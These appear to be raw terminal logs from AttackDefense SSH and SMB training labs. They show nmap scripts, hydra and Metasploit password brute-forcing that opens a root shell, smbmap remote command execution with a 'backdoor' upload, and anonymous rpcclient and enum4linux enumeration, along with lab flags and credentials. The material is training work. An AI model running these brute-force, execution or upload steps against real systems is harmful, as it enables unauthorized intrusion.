Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

root@attackdefense:~# `nc 192.238.103.3 22`
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6

root@attackdefense:~# `ssh root@192.238.103.3`
The authenticity of host '192.238.103.3 (192.238.103.3)' can't be established.
ECDSA key fingerprint is SHA256:dxlBXgBb0Iv5/LmemZ2Eikb5+GLl9CSLf/B854fUeV8.
Are you sure you want to continue connecting (yes/no)? `y`
Please type 'yes' or 'no': `yes`
Warning: Permanently added '192.238.103.3' (ECDSA) to the list of known hosts.
Welcome to attack defense ssh recon lab!!
root@192.238.103.3's password: ``
Permission denied, please try again.
root@192.238.103.3's password: `^c`

root@attackdefense:~# `nmap 192.238.103.3 -p 22 --script ssh2-enum-algos`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-08 05:56 UTC
Nmap scan report for target-1 (192.238.103.3)
Host is up (0.000065s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh2-enum-algos: 
|   kex_algorithms: (6)
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
MAC Address: 02:42:C0:EE:67:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

root@attackdefense:~# `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-08 06:00 UTC
Nmap scan report for target-1 (192.238.103.3)
Host is up (0.000032s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1fkJK7F8yxf3vewEcLYHljBnKTAiRqzFxkFo6lqyew73ATL2Abyh6at/oOmBSlPI90rtAMA6jQGJ+0HlHgf7mkjz5+CBo9j2VPu1bejYtcxpqpHcL5Bp12wgey1zup74fgd+yOzILjtgbnDOw1+HSkXqN79d+4BnK0QF6T9YnkHvBhZyjzIDmjonDy92yVBAIoB6Rdp0w7nzFz3aN9gzB5MW/nSmgc4qp7R6xtzGaqZKp1H3W3McZO3RELjGzvHOdRkAKL7n2kyVAraSUrR0Oo5m5e/sXrITYi9y0X6p2PTUfYiYvgkv/3xUF+5YDDA33AJvv8BblnRcRRZ74BxaD
|   ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB0cJ/kSOXBWVIBA2QH4UB6r7nFL5l7FwHubbSZ9dIs2JSmn/oIgvvQvxmI5YJxkdxRkQlF01KLDmVgESYXyDT4=
|_  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKuZlCFfTgeaMC79zla20ZM2q64mjqWhKPw/2UzyQ2W/
MAC Address: 02:42:C0:EE:67:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds

root@attackdefense:~# `nmap 192.238.103.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-08 06:07 UTC
Nmap scan report for target-1 (192.238.103.3)
Host is up (0.000040s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|_  Supported authentication methods: none_auth
MAC Address: 02:42:C0:EE:67:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

root@attackdefense:~# `ssh student@192.238.103.3`
Welcome to attack defense ssh recon lab!!
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

student@victim-1:~$ `ls`
FLAG
student@victim-1:~$ `ipconfig`
-bash: ipconfig: command not found
student@victim-1:~$ `ifconfig`
-bash: ifconfig: command not found
student@victim-1:~$ `ip a`
-bash: ip: command not found
student@victim-1:~$ `cat FLAG`
e1e3c0c9d409f594afdb18fe9ce0ffec
student@victim-1:~$ `logout`
Connection to 192.238.103.3 closed.


root@attackdefense:~# `gzip -d /usr/share/wordlists/rockyou.txt.gz `
root@attackdefense:~# `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.72.183.3 ssh`
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-08 06:38:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.72.183.3:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344223 to do in 1350:41h, 16 active
[22][ssh] host: 192.72.183.3   login: student   password: `friend`
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-08 06:40:12


root@attackdefense:~# `nmap 192.72.183.3 -p 22 --script ssh-brute --script-args userdb=/root/user`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-08 06:54 UTC
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: administrator:12345
NSE: [ssh-brute] Trying username/password pair: administrator:123456789
NSE: [ssh-brute] Trying username/password pair: administrator:password
NSE: [ssh-brute] Trying username/password pair: administrator:iloveyou
NSE: [ssh-brute] Trying username/password pair: administrator:princess
NSE: [ssh-brute] Trying username/password pair: administrator:12345678
NSE: [ssh-brute] Trying username/password pair: administrator:1234567
NSE: [ssh-brute] Trying username/password pair: administrator:abc123
NSE: [ssh-brute] Trying username/password pair: administrator:nicole
NSE: [ssh-brute] Trying username/password pair: administrator:daniel
NSE: [ssh-brute] Trying username/password pair: administrator:monkey
NSE: [ssh-brute] Trying username/password pair: administrator:babygirl
NSE: [ssh-brute] Trying username/password pair: administrator:qwerty
NSE: [ssh-brute] Trying username/password pair: administrator:lovely
NSE: [ssh-brute] Trying username/password pair: administrator:654321
NSE: [ssh-brute] Trying username/password pair: administrator:michael
NSE: [ssh-brute] Trying username/password pair: administrator:jessica
NSE: [ssh-brute] Trying username/password pair: administrator:111111
NSE: [ssh-brute] Trying username/password pair: administrator:ashley
NSE: [ssh-brute] Trying username/password pair: administrator:000000
NSE: [ssh-brute] Trying username/password pair: administrator:iloveu
NSE: [ssh-brute] Trying username/password pair: administrator:michelle
NSE: [ssh-brute] Trying username/password pair: administrator:tigger
NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
NSE: [ssh-brute] Trying username/password pair: administrator:chocolate
Nmap scan report for target-1 (192.72.183.3)
Host is up (0.000039s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 28 guesses in 5 seconds, average tps: 5.6
MAC Address: 02:42:C0:48:B7:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.78 seconds

msf5 > `use auxiliary/scanner/ssh/ssh_login`
msf5 auxiliary(scanner/ssh/ssh_login) > `options`

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > `set rhosts 192.72.183.3`
rhosts => 192.72.183.3
msf5 auxiliary(scanner/ssh/ssh_login) > `set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt`
userpass_file => /usr/share/wordlists/metasploit/root_userpass.txt
msf5 auxiliary(scanner/ssh/ssh_login) > `set verbose true`
verbose => true
msf5 auxiliary(scanner/ssh/ssh_login) > `set stop_on_success true`
stop_on_success => true
msf5 auxiliary(scanner/ssh/ssh_login) > `run`

[-] 192.72.183.3:22 - Failed: 'root:'
[!] No active DB -- Credential data will not be saved!
[-] 192.72.183.3:22 - Failed: 'root:!root'
[-] 192.72.183.3:22 - Failed: 'root:Cisco'
[-] 192.72.183.3:22 - Failed: 'root:NeXT'
[-] 192.72.183.3:22 - Failed: 'root:QNX'
[-] 192.72.183.3:22 - Failed: 'root:admin'
[+] 192.72.183.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.72.183.2:39231 -> 192.72.183.3:22) at 2023-12-08 07:46:20 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 > `search auxiliary/scanner/ssh`

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   auxiliary/scanner/ssh/apache_karaf_command_execution  2016-02-09       normal  No     Apache Karaf Default Credentials Command Execution
   1   auxiliary/scanner/ssh/cerberus_sftp_enumusers         2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
   2   auxiliary/scanner/ssh/detect_kippo                                     normal  No     Kippo SSH Honeypot Detector
   3   auxiliary/scanner/ssh/eaton_xpert_backdoor            2018-07-18       normal  No     Eaton Xpert Meter SSH Private Key Exposure Scanner
   4   auxiliary/scanner/ssh/fortinet_backdoor               2016-01-09       normal  No     Fortinet SSH Backdoor Scanner
   5   auxiliary/scanner/ssh/juniper_backdoor                2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   6   auxiliary/scanner/ssh/karaf_login                                      normal  No     Apache Karaf Login Utility
   7   auxiliary/scanner/ssh/libssh_auth_bypass              2018-10-16       normal  No     libssh Authentication Bypass Scanner
   8   auxiliary/scanner/ssh/ssh_enum_git_keys                                normal  No     Test SSH Github Access
   9   auxiliary/scanner/ssh/ssh_enumusers                                    normal  No     SSH Username Enumeration
   10  auxiliary/scanner/ssh/ssh_identify_pubkeys                             normal  No     SSH Public Key Acceptance Scanner
   11  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner
   12  auxiliary/scanner/ssh/ssh_login_pubkey                                 normal  No     SSH Public Key Login Scanner
   13  auxiliary/scanner/ssh/ssh_version                                      normal  No     SSH Version Scanner

Nmap done: 1 IP address (1 host up) scanned in 107.29 seconds

root@attackdefense:~# `smbmap -u guest -p "" -d .  -H 10.5.26.125`

[+] Guest session   	IP: 10.5.26.125:445	Name: 10.5.26.125                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C                                                 	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	D$                                                	NO ACCESS	Default share
	Documents                                         	NO ACCESS	
	Downloads                                         	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ ONLY	Printer Drivers


root@attackdefense:~# `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125`
[+] IP: 10.5.26.125:445	Name: 10.5.26.125                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C                                                 	READ ONLY	
	C$                                                	READ, WRITE	Default share
	D$                                                	READ, WRITE	Default share
	Documents                                         	READ ONLY	
	Downloads                                         	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ, WRITE	Printer Drivers


root@attackdefense:~# `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -x 'ipconfig'`
                                
Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::f13f:e406:7352:df4f%22
   IPv4 Address. . . . . . . . . . . : 10.5.26.125
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.5.16.1

Tunnel adapter isatap.ap-south-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-south-1.compute.internal

root@attackdefense:~# `smbmap -u administrator -p smbserver_771 -d .  -H 10.5.26.125 -r 'C$'`

[+] IP: 10.5.26.125:445	Name: 10.5.26.125                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--       8589934592 Fri Dec  1 11:38:47 2023	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Fri Dec  1 12:15:18 2023	Windows



root@attackdefense:~# `smbmap -u administrator -p smbserver_771 --upload '/root/backdoor' 'C$\backdoor' -H 10.5.24.17`
[+] Starting upload: /root/backdoor (0 bytes)
[+] Upload complete
root@attackdefense:~# `smbmap -u administrator -p smbserver_771 -r 'C$' -H 10.5.24.17`
[+] IP: 10.5.24.17:445	Name: 10.5.24.17                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fr--r--r--                0 Fri Dec  1 12:48:51 2023	backdoor
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               29 Fri Dec  1 13:09:13 2023	flag.txt
	fr--r--r--       8589934592 Fri Dec  1 12:42:04 2023	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Fri Dec  1 13:00:49 2023	Windows


root@attackdefense:~# `smbmap -u administrator -p smbserver_771 --download 'C$\flag.txt' -H 10.5.24.17`
[+] Starting download: C$\flag.txt (29 bytes)
[+] File output to: /root/10.5.24.17-C_flag.txt
root@attackdefense:~# `ls `       
10.5.24.17-C_Bootmgr  10.5.24.17-C_flag.txt  Desktop  backdoor	flag.txt  thinclient_drives

root@attackdefense:~# cat flag.txt 
kjdfi;jdubc;iwqugf;isdbf;wei


root@attackdefense:~# `nmap 192.213.18.3 -sV`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-02 06:33 UTC
Nmap scan report for target-1 (192.213.18.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
MAC Address: 02:42:C0:D5:12:03 (Unknown)
Service Info: Host: SAMBA-RECON

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds

root@attackdefense:~# `nmap --top-port 25 -sU --open 192.213.18.3`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-02 06:41 UTC
Nmap scan report for target-1 (192.213.18.3)
Host is up (0.000060s latency).
Not shown: 23 closed ports
PORT    STATE         SERVICE
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
MAC Address: 02:42:C0:D5:12:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds


root@attackdefense:~# `nmap --top-port 25 -sU --open 192.213.18.3 -sV`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-02 06:45 UTC
Nmap scan report for target-1 (192.213.18.3)
Host is up (0.000052s latency).
Not shown: 13 closed ports
PORT     STATE         SERVICE     VERSION
53/udp   open|filtered domain
67/udp   open|filtered dhcps
68/udp   open|filtered dhcpc
135/udp  open|filtered msrpc
137/udp  open          netbios-ns  Samba nmbd netbios-ns (workgroup: RECONLABS)
138/udp  open|filtered netbios-dgm
139/udp  open|filtered netbios-ssn
161/udp  open|filtered snmp
514/udp  open|filtered syslog
631/udp  open|filtered ipp
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike
MAC Address: 02:42:C0:D5:12:03 (Unknown)
Service Info: Host: SAMBA-RECON

root@attackdefense:~# `nmap -p 445 192.213.18.3 --script smb-os-discovery`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-02 06:52 UTC
Nmap scan report for target-1 (192.213.18.3)
Host is up (0.000057s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:D5:12:03 (Unknown)

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: victim-1
|   NetBIOS computer name: SAMBA-RECON\x00
|   Domain name: \x00
|   FQDN: victim-1
|_  System time: 2023-12-02T06:52:17+00:00

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds


root@attackdefense:~# `nmblookup -A 192.221.150.3`
Looking up status of 192.221.150.3
        SAMBA-RECON     <00> -         H <ACTIVE> 
        SAMBA-RECON     <03> -         H <ACTIVE> 
        SAMBA-RECON     <20> -         H <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE> 
        RECONLABS       <00> - <GROUP> H <ACTIVE> 
        RECONLABS       <1d> -         H <ACTIVE> 
        RECONLABS       <1e> - <GROUP> H <ACTIVE> 

        MAC Address = 00-00-00-00-00-00

root@attackdefense:~# `smbclient -L 192.221.150.3`
Enter WORKGROUP\GUEST's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON



root@attackdefense:~# `smbclient //192.120.159.3/public - N`
Try "help" to get a list of possible commands.
smb: \> `help`
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> `ls`
  .                                   D        0  Tue Dec  5 11:35:13 2023
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  dev                                 D        0  Tue Nov 27 13:36:13 2018
  secret                              D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 196128748 blocks available
smb: \> `cd secret`
smb: \secret\> `ls`
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Dec  5 11:35:13 2023
  flag                                N       33  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 196128732 blocks available
smb: \secret\> `cat flag`
cat: command not found
smb: \secret\> `get flag`
getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \secret\> `exit`
root@attackdefense:~# `ls`
README  flag  tools  wordlists
root@attackdefense:~# `cat flag`
03ddb97933e716f5057a18632badb3b4


root@attackdefense:/# smbclient //192.241.81.3/admin -U admin
Enter WORKGROUP\admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Dec  6 06:11:04 2023
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  hidden                              D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 202553476 blocks available
smb: \> cd hidden
smb: \hidden\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Wed Dec  6 06:11:04 2023
  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 202553476 blocks available
smb: \hidden\> get flag.tar.gz 
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (147.4 KiloBytes/sec) (average 147.5 KiloBytes/sec)
smb: \hidden\> exit
root@attackdefense:/# ls
0  bin  boot  dev  etc  flag.tar.gz  home  lib  lib32  lib64  media  mnt  opt  proc  root  run  sbin  srv  startup.sh  sys  tmp  usr  var
root@attackdefense:/# gzip -d flag.tar.gz 
root@attackdefense:/# cat flag.tar 
flag0000644000000000001530000000004113377315030011541 0ustar  rootsambashare2727069bc058053bd561ce372721c92e
root@attackdefense:/# 

root@attackdefense:~# `rpcclient -U "" -N 192.230.148.3`
rpcclient $> status
command not found: status
rpcclient $> 
rpcclient $> srvinfo
        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


root@attackdefense:~# `rpcclient -U "" -N 192.54.223.3`
rpcclient $> `enumdomusers`   
user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]
rpcclient $> 


root@attackdefense:~# `rpcclient -U "" -N 192.54.223.3`
rpcclient $> `lookupnames admin`
admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)
rpcclient $> 

root@attackdefense:~# `rpcclient -U "" -N 192.120.159.3`
rpcclient $> enumdomgroups
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]
rpcclient $> 

root@attackdefense:~# `enum4linux -O 192.54.223.3 -p 445`
Unknown option: O
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec  5 06:38:14 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.54.223.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 192.54.223.3    |
 ==================================================== 
[+] Got domain/workgroup name: RECONLABS

 ============================================ 
|    Nbtstat Information for 192.54.223.3    |
 ============================================ 
Looking up status of 192.54.223.3
        SAMBA-RECON     <00> -         H <ACTIVE>  Workstation Service
        SAMBA-RECON     <03> -         H <ACTIVE>  Messenger Service
        SAMBA-RECON     <20> -         H <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
        RECONLABS       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        RECONLABS       <1d> -         H <ACTIVE>  Master Browser
        RECONLABS       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 192.54.223.3    |
 ===================================== 
[+] Server 192.54.223.3 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 192.54.223.3    |
 =========================================== 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 192.54.223.3    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.54.223.3 from smbclient: 
[+] Got OS info for 192.54.223.3 from srvinfo:
        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================= 
|    Users on 192.54.223.3    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: john     Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elie     Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: aisha    Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: shawn    Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: emma     Name:   Desc: 
index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 

user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]

 ========================================= 
|    Share Enumeration on 192.54.223.3    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON

[+] Attempting to map shares on 192.54.223.3
//192.54.223.3/public   Mapping: OK, Listing: OK
//192.54.223.3/john     Mapping: DENIED, Listing: N/A
//192.54.223.3/aisha    Mapping: DENIED, Listing: N/A
//192.54.223.3/emma     Mapping: DENIED, Listing: N/A
//192.54.223.3/everyone Mapping: DENIED, Listing: N/A
//192.54.223.3/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 192.54.223.3    |
 ==================================================== 


[+] Attaching to 192.54.223.3 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] SAMBA-RECON
        [+] Builtin

[+] Password Info for Domain: SAMBA-RECON

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 192.54.223.3    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:
group:[Testing] rid:[0x3f0]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 192.54.223.3 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-4056189605-2085045094-1961111545
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-4056189605-2085045094-1961111545 and logon username '', password ''
S-1-5-21-4056189605-2085045094-1961111545-500 *unknown*\*unknown* (8)
